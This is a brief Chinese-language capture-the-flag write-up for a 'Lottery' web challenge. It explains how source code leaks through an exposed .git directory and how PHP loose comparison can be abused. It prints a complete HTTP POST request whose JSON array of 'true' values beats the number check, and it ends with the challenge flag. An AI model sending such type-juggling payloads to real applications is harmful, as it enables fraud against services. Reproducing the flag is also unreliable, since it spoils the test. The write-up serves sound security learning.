# Lottery

> Git文件泄露+弱类型比较

## 思路分析

> Git文件泄露+弱类型比较,通过git文件泄露或者下载附件获取源代码,分析代码得知是要输入一串长度为7的字符,服务端会随机生成7个数字,这二个一次对比,相同的次数越多,奖励越多,当账户上的钱大于9990000时就能直接购买flag了.一看就是考察的php弱类型比较.传入一个数组,数组每个元素是true即可,只要服务端生成的数字不全是0则会获取奖励,奖励达到要求后购买flag.

## payload

```
POST /api.php HTTP/1.1
Host: 61.147.171.105:54275
Content-Length: 63
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Content-Type: application/json
Origin: http://61.147.171.105:54275
Referer: http://61.147.171.105:54275/buy.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=lb8pf8pkg1drfe7il17dkrh374
Connection: close

{"action":"buy","numbers":[true,true,true,true,true,true,true]}
```

## flag

> cyberpeace{794ac976a443f8743f6118ca179fa112}